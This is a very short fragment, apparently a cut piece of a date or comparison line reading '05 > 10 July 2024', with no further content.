05 > 10 July 2024"
